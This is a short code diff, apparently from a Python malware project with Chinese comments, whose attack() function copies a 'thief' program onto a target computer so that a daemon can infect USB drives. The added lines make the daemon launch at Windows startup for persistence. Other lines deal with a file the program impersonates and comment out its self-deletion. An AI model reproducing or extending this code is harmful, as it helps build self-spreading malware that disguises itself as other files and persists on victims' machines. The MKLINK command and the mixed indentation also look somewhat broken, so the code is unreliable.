@@ -44,6 +44,8 @@ def attack():
     #2.复制本程序到目标电脑,因为daemon在感染u盘时需要复制本程序
     thief_file=file(os.path.abspath(__file__))
     thief_file.copy(THIEF_PATH)
+	#3.将daemon设为开机自启动
+    os.system("MKLINK /D "+DAEMON_PATH+" C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUP")
 
 
 def getfile(): #获得被冒充的文件的路径
@@ -77,4 +79,4 @@ os.system(path)
 if target.enermy==False:
     win32api.SetFileAttributes(os.getcwd()+getname(), win32con.FILE_ATTRIBUTE_NORMAL)
     thisfile=file(__file__)
-    thisfile.delete()
+#    thisfile.delete()
